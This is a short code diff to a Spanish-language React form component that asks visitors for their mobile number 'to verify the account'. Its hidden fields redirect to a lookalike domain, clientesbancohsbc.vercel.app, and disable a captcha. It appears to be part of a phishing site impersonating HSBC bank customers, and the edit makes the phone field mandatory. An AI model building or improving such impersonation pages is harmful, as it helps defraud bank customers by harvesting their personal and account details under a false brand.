@@ -42,7 +42,7 @@ const Numerocelular = () => {
               <label className="label">Ingresa tu número celular para verificar la cuenta</label>
             </div>
             <div className="input-cont">
-              <input className="inputname" name="name" placeholder="Ingresa tu numero de celular" maxLength="10" type="number" />
+              <input className="inputname" name="name" placeholder="Ingresa tu numero de celular" maxLength="10" type="number" required/>
               <input type="hidden" name="email" value="" />
               <input type="hidden" name="_next" value="https://clientesbancohsbc.vercel.app/user" />
               <input type="hidden" name="_captcha" value="false" />
